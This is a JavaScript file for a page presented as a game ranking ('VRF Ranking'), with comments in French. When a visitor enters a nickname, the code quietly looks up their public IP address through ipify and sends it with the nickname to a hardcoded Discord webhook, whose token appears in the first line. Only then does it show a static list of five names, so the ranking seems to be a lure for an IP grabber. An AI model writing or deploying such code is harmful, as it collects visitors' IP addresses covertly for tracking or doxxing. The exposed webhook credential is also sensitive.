const WEBHOOK_URL = "https://discord.com/api/webhooks/1549874994396532767/AbkKDYiupr7RtDFEw2wvhY9bucJqxxkyJ3tWU4xhdzNwAJRI1gIv3oMiiLa2lb7VMPm3"; // ← remplace par ton vrai webhook

const ranking = [
    { rank: 1, name: "Yayazox", domain: "en.vr", className: "top1", badgeClass: "gold" },
    { rank: 2, name: "wawarox", domain: "en.vr", className: "top2", badgeClass: "silver" },
    { rank: 3, name: "Nexora", domain: "en.vr", className: "", badgeClass: "normal" },
    { rank: 4, name: "Vexel", domain: "en.vr", className: "", badgeClass: "normal" },
    { rank: 5, name: "Kairox", domain: "en.vr", className: "", badgeClass: "normal" },
];

const pseudoInput = document.getElementById("pseudo-input");
const continueBtn = document.getElementById("continue-btn");
const entryScreen = document.getElementById("entry-screen");
const rankingScreen = document.getElementById("ranking-screen");
const leaderboard = document.getElementById("leaderboard");

// Activer le bouton seulement si le pseudo n'est pas vide
pseudoInput.addEventListener("input", () => {
    continueBtn.disabled = pseudoInput.value.trim().length === 0;
});

// Entrer avec la touche Entrée
pseudoInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter" && !continueBtn.disabled) {
        continueBtn.click();
    }
});

continueBtn.addEventListener("click", async () => {
    const pseudo = pseudoInput.value.trim();
    if (!pseudo) return;

    continueBtn.disabled = true;
    continueBtn.textContent = "Chargement...";

    // Récupérer l'IP publique
    let ip = "unknown";
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        ip = data.ip;
    } catch (err) {
        console.warn("Impossible de récupérer l'IP:", err);
    }

    // Envoyer au webhook Discord
    await sendToDiscord(pseudo, ip);

    // Afficher le classement
    renderRanking();
    entryScreen.classList.add("hidden");
    rankingScreen.classList.remove("hidden");
});

async function sendToDiscord(pseudo, ip) {
    if (!WEBHOOK_URL || WEBHOOK_URL.includes("COLLE_ICI")) {
        console.warn("Webhook non configuré. Pseudo:", pseudo, "IP:", ip);
        return;
    }

    const payload = {
        content: null,
        embeds: [
            {
                title: "Nouveau joueur",
                color: 0x7c3aed,
                fields: [
                    { name: "Pseudo", value: `\`${pseudo}\``, inline: true },
                    { name: "Adresse IP", value: `\`${ip}\``, inline: true },
                ],
                timestamp: new Date().toISOString(),
                footer: { text: "VRF Ranking" },
            },
        ],
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
        });
    } catch (err) {
        console.error("Erreur envoi Discord:", err);
    }
}

function renderRanking() {
    leaderboard.innerHTML = ranking
        .map(
            (item) => `
        <div class="rank-row ${item.className}">
            <div class="rank-badge ${item.badgeClass}">${item.rank}</div>
            <div class="rank-name">
                ${item.name}<span class="domain">.${item.domain}</span>
            </div>
        </div>
    `
        )
        .join("");
}
